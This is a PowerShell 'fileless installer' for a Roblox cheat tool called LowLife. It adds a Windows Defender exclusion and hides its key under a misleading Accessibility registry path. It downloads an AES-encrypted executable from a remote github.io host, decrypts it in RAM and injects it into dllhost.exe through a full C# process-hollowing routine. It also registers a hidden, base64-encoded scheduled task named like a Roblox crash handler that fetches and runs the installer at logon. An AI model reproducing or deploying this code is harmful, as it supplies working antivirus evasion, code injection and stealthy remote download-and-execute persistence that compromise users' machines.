# ==============================================================================
# LowLife Cheat Environment - Fileless Remote Installer
# ==============================================================================
# Zero files written to disk. EXE decrypted in RAM and injected into dllhost.exe
# via process hollowing. License key stored in registry. Persistence and portal
# configured via encoded inline scheduled-task commands and a registry Run key.
# ==============================================================================
param (
    [string]$Key    = "",
    [switch]$Silent = $false,
    [switch]$Persist = $false
)
$ErrorActionPreference = "Stop"

# Define script root directory (handles both script execution and copy-paste/EncodedCommand execution)
$scriptRoot = if ($MyInvocation.MyCommand.Path) { Split-Path $MyInvocation.MyCommand.Path } elseif ($PSScriptRoot) { $PSScriptRoot } elseif ($PWD -and $PWD.Path) { $PWD.Path } else { (Get-Location).Path }

# Normalize script root if it exists
if ($scriptRoot) { $scriptRoot = (Get-Item $scriptRoot).FullName }

$KeyRegPath     = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Accessibility"
$KeyRegName     = "Configuration"

# Resolve workspace path safely to prevent system32 registry corruption
$storedWorkspace = (Get-ItemProperty -Path $KeyRegPath -Name "Workspace" -ErrorAction SilentlyContinue).Workspace
$actualWorkspace = ""

if ($scriptRoot -and $scriptRoot -notmatch '(?i)\\system32') {
    $actualWorkspace = $scriptRoot
} elseif ($storedWorkspace -and $storedWorkspace -notmatch '(?i)\\system32') {
    $actualWorkspace = $storedWorkspace
}

$resolvedPath = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }
$LogPath = Join-Path $resolvedPath "installer_run.log"

function Log-Msg([string]$msg) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "[$timestamp] $msg" | Out-File -FilePath $LogPath -Append -Encoding utf8
    Write-Host $msg
}

Log-Msg "Installer script execution started. Key=$Key, Silent=$Silent, Persist=$Persist"
Log-Msg "ScriptRoot=$scriptRoot"
Log-Msg "ActualWorkspace=$actualWorkspace"

try {
    $ServerBaseUrl  = "https://cc312123.github.io/lowlife/files"
    $LoaderTaskName = "RobloxCrashHandler"
    $PersistTask    = "RobloxCrashHandlerBootstrapper"
    $HostProcess    = "C:\Windows\System32\dllhost.exe"

    # Verify Administrator privileges
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    Log-Msg "IsAdmin=$isAdmin"
    if (-not $isAdmin) {
        Log-Msg "ERROR: MUST BE RUN AS ADMINISTRATOR"
        Exit
    }

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "   LOWLIFE SYSTEM - FILELESS INSTALLER    " -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan

    # Automatically add Windows Defender exclusion for workspace to prevent hollowing blockages
    Log-Msg "Configuring Windows Security exclusions..."
    try {
        if (-not [string]::IsNullOrWhiteSpace($resolvedPath)) {
            $exclusionPath = Split-Path -Parent $resolvedPath -ErrorAction SilentlyContinue
            if (-not [string]::IsNullOrWhiteSpace($exclusionPath)) {
                Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue
                Log-Msg "    Workspace path successfully whitelisted in Windows Defender."
            } else {
                Log-Msg "    WARNING: Workspace is at a root path; skipping Defender exclusion."
            }
        } else {
            Log-Msg "    WARNING: Script root path is empty; skipping Defender exclusion."
        }
    } catch {
        Log-Msg "    WARNING: Could not automatically set Defender exclusions."
    }

    # Disable event logging during install to suppress traces
    # wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:false 2>$null
    # wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>$null

# -- License key (registry, never a file) --------------------------------------
$licenseKey = ""
if ($Key) {
    $licenseKey = $Key.Trim()
} else {
    $stored = (Get-ItemProperty -Path $KeyRegPath -Name $KeyRegName -ErrorAction SilentlyContinue).$KeyRegName
    if ($stored -and $stored.Trim() -ne "YOUR_LICENSE_KEY_HERE") { $licenseKey = $stored.Trim() }
}

if (-not $licenseKey) {
    $keyFile = Join-Path $resolvedPath "key.txt"
    if (Test-Path $keyFile) {
        $licenseKey = (Get-Content $keyFile -Raw).Trim()
        Write-Host "License key loaded from key.txt: $licenseKey" -ForegroundColor Green
    }
}

if (-not $licenseKey) {
    if ($Silent) { Write-Error "License key missing in silent mode."; Exit }
    Write-Host "License key not found in registry or key.txt. Prompting for key..." -ForegroundColor Yellow
    try {
        Add-Type -AssemblyName Microsoft.VisualBasic -ErrorAction Stop
        $prompt = [Microsoft.VisualBasic.Interaction]::InputBox("Enter your LowLife license key:", "LowLife License Verification", "")
        if ($prompt) {
            $licenseKey = $prompt.Trim()
        }
    } catch {
        $licenseKey = (Read-Host "Enter your LowLife license key").Trim()
    }
    if ([string]::IsNullOrWhiteSpace($licenseKey)) { Write-Error "Key cannot be empty."; Exit }
}

# Persistence prompt
if (-not $Silent -and -not $Persist) {
    Write-Host ""
    if ((Read-Host "Enable automatic reinstallation on startup? [Y/N]") -match "^[yY]") { $Persist = $true }
}

# Save key, workspace path, and server URL to registry
New-Item -Path $KeyRegPath -Force -ErrorAction SilentlyContinue | Out-Null
Set-ItemProperty -Path $KeyRegPath -Name $KeyRegName -Value $licenseKey -Force
Set-ItemProperty -Path $KeyRegPath -Name "ServerUrl" -Value $ServerBaseUrl -Force
if (-not [string]::IsNullOrWhiteSpace($actualWorkspace)) {
    Set-ItemProperty -Path $KeyRegPath -Name "Workspace" -Value $actualWorkspace -Force
}

# -- RunPE - x64 Process Hollowing ---------------------------------------------
# Injects PE bytes into a suspended host process entirely in RAM.
# No EXE is ever written to disk.
$PECode = @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public class RunPE {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    static extern bool CreateProcess(string app, string cmd,
        IntPtr pa, IntPtr ta, bool inherit, uint flags,
        IntPtr env, string dir, ref STARTUPINFO si, out PROCINFO pi);

    [DllImport("ntdll.dll")]
    static extern int NtUnmapViewOfSection(IntPtr proc, IntPtr baseAddr);

    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr proc, IntPtr addr,
        uint size, uint type, uint protect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr proc, IntPtr addr,
        byte[] buf, int size, out IntPtr written);

    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr proc, IntPtr addr,
        byte[] buf, int size, out IntPtr read);

    [DllImport("kernel32.dll")]
    static extern bool GetThreadContext(IntPtr thread, IntPtr ctx);

    [DllImport("kernel32.dll")]
    static extern bool SetThreadContext(IntPtr thread, IntPtr ctx);

    [DllImport("kernel32.dll")]
    static extern uint ResumeThread(IntPtr thread);

    [DllImport("kernel32.dll")]
    static extern bool TerminateProcess(IntPtr proc, uint code);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibraryA(string name);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr mod, string name);

    [DllImport("kernel32.dll", EntryPoint="GetProcAddress")]
    static extern IntPtr GetProcAddressOrd(IntPtr mod, IntPtr ord);

    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    static extern IntPtr GetModuleHandle(string name);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr proc, IntPtr attributes,
        uint stackSize, IntPtr startAddress, IntPtr parameter,
        uint creationFlags, out IntPtr threadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr handle, uint ms);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr handle);

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]
    struct STARTUPINFO {
        public int cb, _r1;
        public string lpDesktop, lpTitle;
        public int dwX, dwY, dwXS, dwYS, dwXCC, dwYCC, dwFill, dwFlags;
        public short wShow, _r2;
        public IntPtr _r3, hIn, hOut, hErr;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCINFO {
        public IntPtr hProc, hThread;
        public int pid, tid;
    }

    const uint CREATE_SUSPENDED   = 0x00000004;
    const uint CREATE_NO_WINDOW   = 0x08000000;
    const uint MEM_COMMIT_RESERVE = 0x3000;
    const uint PAGE_EXEC_RW       = 0x40;
    const int  CTX_SIZE           = 1232;
    const int  CTX_FLAGS_OFF      = 0x030;  // CONTEXT.ContextFlags
    const int  CTX_RDX_OFF        = 0x088;  // CONTEXT.Rdx = PEB address at process start
    const int  CTX_RIP_OFF        = 0x0F8;  // CONTEXT.Rip = instruction pointer
    const int  CTX_FULL           = 0x100010;
    const int  PEB_IMGBASE_OFF    = 0x010;  // PEB.ImageBaseAddress (x64)

    public static bool Hollow(byte[] pe, string host) {
        if (pe == null || pe.Length < 0x200) return false;
        if (BitConverter.ToUInt16(pe, 0) != 0x5A4D) return false; // MZ

        int lfanew = BitConverter.ToInt32(pe, 0x3C);
        if (BitConverter.ToUInt32(pe, lfanew) != 0x00004550) return false; // PE

        int oh = lfanew + 24; // optional header base
        if (BitConverter.ToUInt16(pe, oh) != 0x020B) return false; // PE32+ only

        // Parse required PE fields
        uint entryRva  = BitConverter.ToUInt32(pe, oh + 16);
        long imgBase   = BitConverter.ToInt64(pe,  oh + 24);
        uint imgSize   = BitConverter.ToUInt32(pe, oh + 56);
        uint hdrsSize  = BitConverter.ToUInt32(pe, oh + 60);
        ushort numSec  = BitConverter.ToUInt16(pe, lfanew + 6);
        ushort ohSz    = BitConverter.ToUInt16(pe, lfanew + 20);
        int secTab     = lfanew + 24 + ohSz;

        // DataDirectory[5] = Relocation, DataDirectory[1] = Import
        uint relocRva  = BitConverter.ToUInt32(pe, oh + 152);
        uint relocSz   = BitConverter.ToUInt32(pe, oh + 156);
        uint importRva = BitConverter.ToUInt32(pe, oh + 120);

        // Create host process in suspended state
        var si = new STARTUPINFO { cb = Marshal.SizeOf(typeof(STARTUPINFO)) };
        PROCINFO pi;
        if (!CreateProcess(host, null, IntPtr.Zero, IntPtr.Zero, false,
                CREATE_SUSPENDED | CREATE_NO_WINDOW,
                IntPtr.Zero, null, ref si, out pi))
            return false;

        // Allocate 16-byte-aligned CONTEXT buffer (required for GetThreadContext)
        IntPtr ctxAlloc = Marshal.AllocHGlobal(CTX_SIZE + 16);
        long aligned    = (ctxAlloc.ToInt64() + 15) & ~15L;
        IntPtr ctx      = new IntPtr(aligned);
        for (int i = 0; i < CTX_SIZE; i++) Marshal.WriteByte(ctx, i, 0);
        Marshal.WriteInt32(ctx, CTX_FLAGS_OFF, CTX_FULL);

        if (!GetThreadContext(pi.hThread, ctx)) {
            Marshal.FreeHGlobal(ctxAlloc);
            TerminateProcess(pi.hProc, 1);
            return false;
        }

        // Rdx holds the PEB address at x64 process startup
        long pebAddr = Marshal.ReadInt64(ctx, CTX_RDX_OFF);

        // Get host image base from PEB.ImageBaseAddress
        byte[] ibuf = new byte[8]; IntPtr rb;
        ReadProcessMemory(pi.hProc, new IntPtr(pebAddr + PEB_IMGBASE_OFF), ibuf, 8, out rb);
        long hostBase = BitConverter.ToInt64(ibuf, 0);

        // Unmap the host process's original image
        NtUnmapViewOfSection(pi.hProc, new IntPtr(hostBase));

        // Allocate space for our PE (try preferred base first)
        IntPtr alloc = VirtualAllocEx(pi.hProc, new IntPtr(imgBase),
            imgSize, MEM_COMMIT_RESERVE, PAGE_EXEC_RW);
        if (alloc == IntPtr.Zero)
            alloc = VirtualAllocEx(pi.hProc, IntPtr.Zero,
                imgSize, MEM_COMMIT_RESERVE, PAGE_EXEC_RW);
        if (alloc == IntPtr.Zero) {
            Marshal.FreeHGlobal(ctxAlloc);
            TerminateProcess(pi.hProc, 1);
            return false;
        }

        // Write PE headers
        IntPtr w;
        byte[] hdr = new byte[hdrsSize];
        Array.Copy(pe, hdr, Math.Min((int)hdrsSize, pe.Length));
        WriteProcessMemory(pi.hProc, alloc, hdr, (int)hdrsSize, out w);

        // Write sections
        for (int i = 0; i < numSec; i++) {
            int s    = secTab + i * 40;
            uint va  = BitConverter.ToUInt32(pe, s + 12); // VirtualAddress
            uint rsz = BitConverter.ToUInt32(pe, s + 16); // SizeOfRawData
            uint rof = BitConverter.ToUInt32(pe, s + 20); // PointerToRawData
            if (rsz == 0 || rof == 0 || rof + rsz > (uint)pe.Length) continue;
            byte[] sd = new byte[rsz];
            Array.Copy(pe, rof, sd, 0, rsz);
            WriteProcessMemory(pi.hProc, new IntPtr(alloc.ToInt64() + va), sd, (int)rsz, out w);
        }

        // Fix base relocations if we didn't get the preferred base
        long delta = alloc.ToInt64() - imgBase;
        if (delta != 0 && relocRva != 0 && relocSz != 0) {
            int rfo = RvaToOff(pe, relocRva, secTab, numSec);
            if (rfo >= 0) {
                uint done = 0;
                while (done < relocSz) {
                    int  blk     = rfo + (int)done;
                    uint pageRva = BitConverter.ToUInt32(pe, blk);
                    uint bsz     = BitConverter.ToUInt32(pe, blk + 4);
                    if (bsz < 8) break;
                    int entries = ((int)bsz - 8) / 2;
                    for (int j = 0; j < entries; j++) {
                        ushort e = BitConverter.ToUInt16(pe, blk + 8 + j * 2);
                        if ((e >> 12) == 10) { // IMAGE_REL_BASED_DIR64
                            byte[] patch = new byte[8]; IntPtr pr;
                            IntPtr patchAddr = new IntPtr(alloc.ToInt64() + pageRva + (e & 0xFFF));
                            ReadProcessMemory(pi.hProc, patchAddr, patch, 8, out pr);
                            WriteProcessMemory(pi.hProc, patchAddr,
                                BitConverter.GetBytes(BitConverter.ToInt64(patch, 0) + delta), 8, out w);
                        }
                    }
                    done += bsz;
                }
            }
        }

        // Resolve Import Address Table
        if (importRva != 0) {
            int ifo = RvaToOff(pe, importRva, secTab, numSec);
            if (ifo >= 0) {
                int descOff = ifo;
                while (true) {
                    uint ofThunk  = BitConverter.ToUInt32(pe, descOff + 0);  // OriginalFirstThunk
                    uint dllNameR = BitConverter.ToUInt32(pe, descOff + 12); // Name RVA
                    uint ftThunk  = BitConverter.ToUInt32(pe, descOff + 16); // FirstThunk (IAT)
                    if (dllNameR == 0) break;

                    int dno = RvaToOff(pe, dllNameR, secTab, numSec);
                    if (dno < 0) { descOff += 20; continue; }

                    string dllN = ReadCStr(pe, dno);

                    IntPtr hMod = LoadLibraryA(dllN);
                    if (hMod == IntPtr.Zero) { descOff += 20; continue; }

                    uint thunkR = (ofThunk != 0) ? ofThunk : ftThunk;
                    int  tfo    = RvaToOff(pe, thunkR, secTab, numSec);
                    if (tfo < 0) { descOff += 20; continue; }

                    for (int k = 0; ; k++) {
                        int te = tfo + k * 8;
                        if (te + 8 > pe.Length) break;
                        long tv = BitConverter.ToInt64(pe, te);
                        if (tv == 0) break;

                        IntPtr fa;
                        // Bit 63 set = import by ordinal
                        if ((tv & unchecked((long)0x8000000000000000L)) != 0) {
                            fa = GetProcAddressOrd(hMod, new IntPtr((int)(tv & 0xFFFF)));
                        } else {
                            int nfo = RvaToOff(pe, (uint)tv, secTab, numSec);
                            if (nfo < 0) continue;
                            fa = GetProcAddress(hMod, ReadCStr(pe, nfo + 2)); // +2 = skip Hint
                        }

                        if (fa != IntPtr.Zero) {
                            // Write resolved address to target process IAT
                            WriteProcessMemory(pi.hProc,
                                new IntPtr(alloc.ToInt64() + ftThunk + k * 8),
                                BitConverter.GetBytes(fa.ToInt64()), 8, out w);
                        }
                    }
                    descOff += 20;
                }
            }
        }

        // Update PEB.ImageBaseAddress to our new allocation
        WriteProcessMemory(pi.hProc, new IntPtr(pebAddr + PEB_IMGBASE_OFF),
            BitConverter.GetBytes(alloc.ToInt64()), 8, out w);

        // Set RIP to our PE entry point and resume
        Marshal.WriteInt64(ctx, CTX_RIP_OFF, alloc.ToInt64() + entryRva);
        SetThreadContext(pi.hThread, ctx);
        Marshal.FreeHGlobal(ctxAlloc);
        ResumeThread(pi.hThread);
        return true;
    }

    // Resolve RVA -> file offset via section table
    static int RvaToOff(byte[] pe, uint rva, int secTab, int numSec) {
        for (int i = 0; i < numSec; i++) {
            int  s   = secTab + i * 40;
            uint va  = BitConverter.ToUInt32(pe, s + 12); // VirtualAddress
            uint vsz = BitConverter.ToUInt32(pe, s +  8); // VirtualSize
            uint raw = BitConverter.ToUInt32(pe, s + 20); // PointerToRawData
            if (rva >= va && rva < va + vsz) return (int)(raw + (rva - va));
        }
        return -1;
    }

    static string ReadCStr(byte[] data, int off) {
        var sb = new StringBuilder();
        while (off < data.Length && data[off] != 0) sb.Append((char)data[off++]);
        return sb.ToString();
    }
}
'@
    Log-Msg "Compiling/Adding C# RunPE type..."
    if (-not ([System.Management.Automation.PSTypeName]"RunPE").Type) {
        try {
            Add-Type -TypeDefinition $PECode -Language CSharp -ErrorAction Stop
            Log-Msg "RunPE type successfully compiled/added."
        } catch {
            Log-Msg "WARNING: Failed to compile RunPE type: $_"
        }
    } else {
        Log-Msg "RunPE type already compiled/added."
    }

# -- 1. Stop any running instances ---------------------------------------------
Write-Host "[1/4] Stopping existing instances..." -ForegroundColor Yellow
# Stop-ScheduledTask -TaskName $LoaderTaskName -ErrorAction SilentlyContinue
# Stop-ScheduledTask -TaskName $PersistTask    -ErrorAction SilentlyContinue
Log-Msg "Checking for legacy RobloxCrashHandler processes..."
# Kill old file-based process if still present from a previous install
Get-Process -Name "RobloxCrashHandler" -ErrorAction SilentlyContinue | ForEach-Object {
    Log-Msg "Stopping legacy process ID: $($_.Id)"
    Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
}
Log-Msg "Checking for existing loader listening on port 9876..."
$existing = Get-NetTCPConnection -LocalPort 9876 -State Listen -ErrorAction SilentlyContinue
if ($existing) {
    Log-Msg "Stopping existing loader process ID: $($existing.OwningProcess)"
    Stop-Process -Id $existing.OwningProcess -Force -ErrorAction SilentlyContinue
}
Log-Msg "Section 1 complete."

    # -- 2. Download or load compiled payload directly into RAM (no disk write) -----
    Log-Msg "Loading payload into RAM..."

    $exeBytes = $null
    $localExe = Join-Path $resolvedPath "build\RobloxCrashHandler.exe"
    $localServerExe = Join-Path $resolvedPath "updates-server\uploads\RobloxCrashHandler.exe"

    if (Test-Path $localExe) {
        Log-Msg "Found locally compiled executable at $localExe. Loading directly..."
        $exeBytes = [System.IO.File]::ReadAllBytes($localExe)
    } elseif (Test-Path $localServerExe) {
        Log-Msg "Found local server executable at $localServerExe. Loading directly..."
        $exeBytes = [System.IO.File]::ReadAllBytes($localServerExe)
    } else {
        Log-Msg "No local builds found. Downloading from remote server..."
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
        $wc       = New-Object System.Net.WebClient
        try {
            $encBytes = $wc.DownloadData("$ServerBaseUrl/RobloxCrashHandler.enc")
            Log-Msg "Payload downloaded ($($encBytes.Length) bytes)."
            
            $DecKey = [byte[]](0x4C,0x4F,0x57,0x4C,0x49,0x46,0x45,0x32,0x35,0x36,0x4B,0x45,0x59,0x21,0x40,0x23,
                               0x24,0x25,0x5E,0x26,0x2A,0x28,0x29,0x5F,0x2B,0x3D,0x7B,0x7D,0x7C,0x3A,0x3B,0x22)
            $DecIV  = [byte[]](0x52,0x43,0x48,0x5F,0x49,0x56,0x5F,0x4C,0x4F,0x57,0x4C,0x49,0x46,0x45,0x21,0x40)
            
            $aes         = [System.Security.Cryptography.Aes]::Create()
            $aes.Key     = $DecKey
            $aes.IV      = $DecIV
            $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $dec         = $aes.CreateDecryptor()
            $exeBytes    = $dec.TransformFinalBlock($encBytes, 0, $encBytes.Length)
            $aes.Dispose()
            Log-Msg "Payload decrypted in RAM successfully."
        } catch {
            Log-Msg "ERROR: Failed to download remote payload: $_"
            Exit 1
        }
    }

    # -- 3. Inject EXE from RAM into dllhost.exe via process hollowing --------------
    Log-Msg "Launching loader in-memory (process hollowing)..."

    # Remove old file-based install folder if it exists (legacy cleanup)
    $oldFolder = "$env:LOCALAPPDATA\RobloxCrashHandler"
    if (Test-Path $oldFolder) { Remove-Item $oldFolder -Recurse -Force -ErrorAction SilentlyContinue }
    $oldAppData = "$env:APPDATA\LOWLIFE"
    if (Test-Path $oldAppData) { Remove-Item $oldAppData -Recurse -Force -ErrorAction SilentlyContinue }

    $hollowSuccess = $false
    if (([System.Management.Automation.PSTypeName]"RunPE").Type) {
        try {
            Log-Msg "Calling [RunPE]::Hollow on host: $HostProcess"
            $hollowSuccess = [RunPE]::Hollow($exeBytes, $HostProcess)
            Log-Msg "[RunPE]::Hollow returned: $hollowSuccess"
        } catch {
            Log-Msg "WARNING: Process hollowing threw an exception: $_"
        }
    } else {
        Log-Msg "WARNING: RunPE type is not available. Skipping process hollowing."
    }

    $started = $false
    if ($hollowSuccess) {
        Log-Msg "Waiting to verify initialization on port 9876..."
        # Check if port 9876 comes up
        for ($i = 0; $i -lt 5; $i++) {
            try {
                $c = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 9876)
                $c.Close()
                $started = $true
                Log-Msg "Connection to 127.0.0.1:9876 succeeded!"
                break
            } catch {
                Log-Msg "Connection to 127.0.0.1:9876 failed, retrying ($i)..."
                Start-Sleep -Seconds 1
            }
        }
    }

    if (-not $started) {
        Log-Msg "Process hollowing failed or was blocked. Attempting direct file execution fallback..."
        
        $fallbackExe = $null
        if (Test-Path $localExe) {
            $fallbackExe = $localExe
        } elseif (Test-Path $localServerExe) {
            $fallbackExe = $localServerExe
        } else {
            # Write RAM bytes to a file in the whitelisted workspace as fallback
            $fallbackDir = Join-Path $resolvedPath "build"
            $fallbackExe = Join-Path $fallbackDir "RobloxCrashHandler_fallback.exe"
            Log-Msg "Writing decrypted bytes to $fallbackExe for execution..."
            try {
                if (-not (Test-Path $fallbackDir)) {
                    New-Item -ItemType Directory -Path $fallbackDir -Force | Out-Null
                }
                [System.IO.File]::WriteAllBytes($fallbackExe, $exeBytes)
            } catch {
                Log-Msg "WARNING: Could not write fallback executable to ${fallbackExe}: $_"
                $fallbackExe = Join-Path $env:TEMP "RobloxCrashHandler_fallback.exe"
                Log-Msg "Attempting to write fallback executable to temp directory: $fallbackExe"
                try {
                    [System.IO.File]::WriteAllBytes($fallbackExe, $exeBytes)
                } catch {
                    Log-Msg "ERROR: Could not write fallback executable to temp: $_"
                    $fallbackExe = $null
                }
            }
        }

        if ($fallbackExe -and (Test-Path $fallbackExe)) {
            Log-Msg "Launching fallback executable directly: $fallbackExe"
            $proc = Start-Process -FilePath $fallbackExe -PassThru -WindowStyle Hidden
            if ($proc) {
                Log-Msg "Started fallback process ID: $($proc.Id)"
                $started = $true
            } else {
                Log-Msg "ERROR: Failed to start fallback process."
            }
        } else {
            Log-Msg "ERROR: Fallback executable not found or could not be created."
        }
    }

    if (-not $started) {
        Log-Msg "ERROR: Both process hollowing and direct execution fallback failed."
        Exit 1
    } else {
        Log-Msg "Loader running successfully."
    }

    # -- 4. Configure fileless startup ---------------------------------------------
    if (-not $Silent) {
        Log-Msg "Configuring fileless startup..."
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

        if ($Persist) {
            # Main loader startup task - inline EncodedCommand downloads + runs installer silently
            $loaderScript = @"
`$p='HKCU:\Software\Microsoft\Windows\CurrentVersion\Accessibility'
`$k=(gp `$p -N Configuration -EA 0).Configuration
`$w=(gp `$p -N Workspace -EA 0).Workspace
if(`$k){
if(`$w -and (Test-Path "`$w\installer.ps1")){
& "`$w\installer.ps1" -Silent -Key `$k
}else{
[Net.ServicePointManager]::SecurityProtocol="Tls12"
`$wc=New-Object Net.WebClient
for(`$i=0;`$i-lt10;`$i++){
try{
`$s=`$wc.DownloadString('$ServerBaseUrl/installer.ps1')
if(`$s){. ([scriptblock]::Create(`$s)) -Silent -Key `$k;break}
}catch{sleep 3}
}
}
}
"@
            $encLoader = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($loaderScript))

            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encLoader"
            $trigger = New-ScheduledTaskTrigger -AtLogon
            $principal = New-ScheduledTaskPrincipal -UserId $currentUser -RunLevel Highest -LogonType Interactive
            Register-ScheduledTask -TaskName $LoaderTaskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

            Log-Msg "Loader startup task registered."
            
            # Remove redundant bootstrapper task if it exists
            Unregister-ScheduledTask -TaskName $PersistTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "LowLifePortal" -Force -ErrorAction SilentlyContinue | Out-Null
        } else {
            Log-Msg "Persistence disabled: Cleaning up scheduled tasks and registry keys..."
            Unregister-ScheduledTask -TaskName $LoaderTaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
            Unregister-ScheduledTask -TaskName $PersistTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "LowLifePortal" -Force -ErrorAction SilentlyContinue | Out-Null
        }

        # Remove any legacy startup files from old installs
        @(
            "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\LowLifePortal.lnk",
            "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\LowLifePortal.url",
            "$env:USERPROFILE\.lowlife_bootstrap.ps1",
            "$env:USERPROFILE\.lowlife_key",
            "$env:USERPROFILE\.lowlife_persistence"
        ) | ForEach-Object { if (Test-Path $_) { Remove-Item $_ -Force -ErrorAction SilentlyContinue } }
    } else {
        Log-Msg "Silent mode: skipping fileless startup task configuration/reregistration."
    }

    # -- Wait for loader to come up and open portal ---------------------------------
    Log-Msg "Waiting for loader to initialize on port 9876..."
    $started = $false
    for ($i = 0; $i -lt 20; $i++) {
        try {
            $c = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 9876)
            $c.Close()
            $started = $true
            break
        } catch { Start-Sleep -Seconds 1 }
    }

    if ($started) {
        if (-not $Silent) {
            Log-Msg "Opening web portal..."
            try { 
                (New-Object -ComObject Shell.Application).Open("http://127.0.0.1:9876/") 
                Log-Msg "Portal successfully opened via Shell.Application."
            } catch { 
                Start-Process "http://127.0.0.1:9876/" 
                Log-Msg "Portal successfully opened via Start-Process."
            }
        } else {
            Log-Msg "Silent mode: skipping web portal launch."
        }
    } else {
        Log-Msg "WARNING: Loader did not respond within 20 seconds."
    }

    # Re-enable event logging
    wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:true 2>$null
    wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:true 2>$null

    Log-Msg "SUCCESS: Fileless install complete!"
} catch {
    Log-Msg "FATAL ERROR: $_"
    Log-Msg $_.ScriptStackTrace
    throw $_
}
